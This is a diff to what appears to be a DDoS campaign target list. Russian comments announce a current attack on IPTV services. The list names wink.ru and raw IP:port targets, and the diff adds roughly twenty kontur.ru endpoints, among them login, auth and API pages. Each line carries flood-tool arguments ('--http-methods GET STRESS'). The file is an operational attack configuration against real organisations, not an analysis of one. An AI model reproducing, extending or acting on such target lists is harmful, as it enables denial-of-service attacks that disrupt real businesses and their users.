@@ -7,3 +7,19 @@ https://www.cdek.ru/ru https://cdek.by/ru/ https://leroymerlin.ru https://auth.l
 # Текущая атака
 # Атакуем IPTV-сервисы! 
 https://wink.ru tcp://212.193.155.253:80 tcp://212.193.155.253:443 tcp://37.220.163.158:80 tcp://37.220.163.158:443 tcp://212.193.153.139:443 tcp://87.226.155.212:80 tcp://87.226.155.212:443 --http-methods GET STRESS
+
+https://e-kontur.ru/ https://elba.kontur.ru/AccessControl/Login https://auth.kontur.ru/ https://install.kontur.ru/ https://kontur.ru/ https://api.kontur.ru/csi/support/v1/public/integrations/zakupki https://zakupki.kontur.ru/ https://pf.kontur.ru/ https://help.kontur.ru/ https://focus.kontur.ru/ https://focus-api.kontur.ru/ https://ff.kontur.ru/ https://elbank.kontur.ru/ https://www.b-kontur.ru/ https://developer.kontur.ru/ https://evrika.kontur.ru/ https://cabinet.kontur.ru/ https://ca.kontur.ru/ https://www.kontur-extern.ru/ --http-methods GET STRESS
+
+
+
+
+
+
+
+
+
+
+
+
+
+
